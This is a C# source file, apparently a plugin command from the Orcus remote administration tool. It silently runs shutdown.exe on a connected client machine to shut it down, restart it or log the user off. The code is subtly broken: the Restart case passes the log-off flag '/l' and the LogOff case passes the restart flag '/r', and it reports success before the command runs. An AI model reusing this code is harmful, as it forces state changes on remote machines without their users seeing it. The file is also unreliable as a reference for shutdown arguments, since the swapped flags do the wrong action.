using System;
using System.Diagnostics;
using Orcus.Plugins;
using Orcus.Plugins.PropertyGrid;
using Orcus.Plugins.StaticCommands;

namespace Orcus.StaticCommands.System
{
    public class ChangeComputerStateCommand : StaticCommand
    {
        public ChangeComputerStateCommand()
        {
            this.RegisterProperty(() => ComputerAction,
                Resources.StaticCommands.System_ChangeComputerStateCommand_ComputerState,
                Resources.StaticCommands.System_ChangeComputerStateCommand_ComputerState_Description,
                Resources.StaticCommands.Common);
        }

        public ComputerAction ComputerAction { get; set; }

        public override Guid CommandId { get; } = new Guid(0xbe3fa8a5, 0x2ba0, 0x6245, 0xb5, 0x8e, 0x7f, 0x4a, 0x7b,
            0xf0, 0x84, 0xe1);

        public override string Name { get; } = Resources.StaticCommands.System_ChangeComputerStateCommand_Name;
        public override string Description { get; } = Resources.StaticCommands.System_ChangeComputerStateCommand_Description;
        public override StaticCommandCategory Category { get; } = StaticCommandCategory.System;

        public override InputValidationResult ValidateInput()
        {
            return InputValidationResult.Successful;
        }

        public override void Execute(CommandParameter commandParameter, IFeedbackFactory feedbackFactory, IClientInfo clientInfo)
        {
            commandParameter.InitializeProperties(this);

            string arguments;
            switch (ComputerAction)
            {
                case ComputerAction.Shutdown:
                    arguments = "/s /t 0";
                    break;
                case ComputerAction.Restart:
                    arguments = "/l /t 0";
                    break;
                case ComputerAction.LogOff:
                    arguments = "/r /t 0";
                    break;
                default:
                    feedbackFactory.Failed("Unknown shutdown type");
                    return;
            }

            var psi = new ProcessStartInfo("shutdown.exe", arguments)
            {
                CreateNoWindow = true,
                UseShellExecute = false
            };

            feedbackFactory.Succeeded();

            Process.Start(psi);
        }
    }

    public enum ComputerAction : byte
    {
        Shutdown,
        Restart,
        LogOff
    }
}